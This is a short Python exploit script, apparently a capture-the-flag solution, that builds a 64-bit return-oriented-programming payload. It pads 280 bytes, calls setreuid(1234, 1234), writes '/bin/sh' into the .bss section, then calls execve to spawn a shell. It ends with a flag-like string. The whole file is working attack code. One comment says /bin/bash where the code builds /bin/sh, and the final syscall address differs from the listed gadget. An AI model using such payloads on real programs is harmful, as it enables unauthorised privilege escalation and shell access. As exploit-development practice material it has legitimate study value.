import struct
import sys


#write what where
#bss:00000000006C1C00
#0x000000000044d2b4: pop rax; ret;
#0x0000000000437205: pop rdx; ret; 
#0x000000000046d323: mov dword ptr [rdx], eax; mov eax, 1; ret;
#0x00000000004016d3: pop rdi; ret;
#0x00000000004017e7: pop rsi; ret;
#0x000000000045b525: syscall; ret;

buff = b''
buff += b'A' * 280


#mov 0x71 (113) sys_setreuid
buff += struct.pack('<Q', 0x000000000044d2b4)
buff += struct.pack('<Q', 113)

#mov euid = 1234 to rsi
buff += struct.pack('<Q', 0x00000000004017e7)
buff += struct.pack('<Q', 1234)

#mov uid = 1234 to rdi
buff += struct.pack('<Q', 0x00000000004016d3)
buff += struct.pack('<Q', 1234)

#syscall
buff += struct.pack('<Q', 0x000000000045b525)

#mov /bin to bss
buff += struct.pack('<Q', 0x000000000044d2b4)
buff += b"/bin\x00\x00\x00\x00"
buff += struct.pack('<Q', 0x0000000000437205)
buff += struct.pack('<Q', 0x00000000006C1C00)
buff += struct.pack('<Q', 0x000000000046d323)

#mov /sh to bss
buff += struct.pack('<Q', 0x000000000044d2b4)
buff += b"/sh\x00\x00\x00\x00\x00"
buff += struct.pack('<Q', 0x0000000000437205)
buff += struct.pack('<Q', 0x00000000006C1C00 + 4)
buff += struct.pack('<Q', 0x000000000046d323)


#mov 0x3b (59) sys_execve
buff += struct.pack('<Q', 0x000000000044d2b4)
buff += struct.pack('<Q', 59)

#mov to rdi /bin/bash pointer
buff += struct.pack('<Q', 0x00000000004016d3)
buff += struct.pack('<Q', 0x00000000006C1C00)

#null rsi
buff += struct.pack('<Q', 0x00000000004017e7)
buff += struct.pack('<Q', 0)

#null rdx
buff += struct.pack('<Q', 0x0000000000437205)
buff += struct.pack('<Q', 0)

#syscall
buff += struct.pack('<Q', 0x0000000000400488)

print (buff)


"""
BufFErOvErFlOw-In-64-BiTs
"""
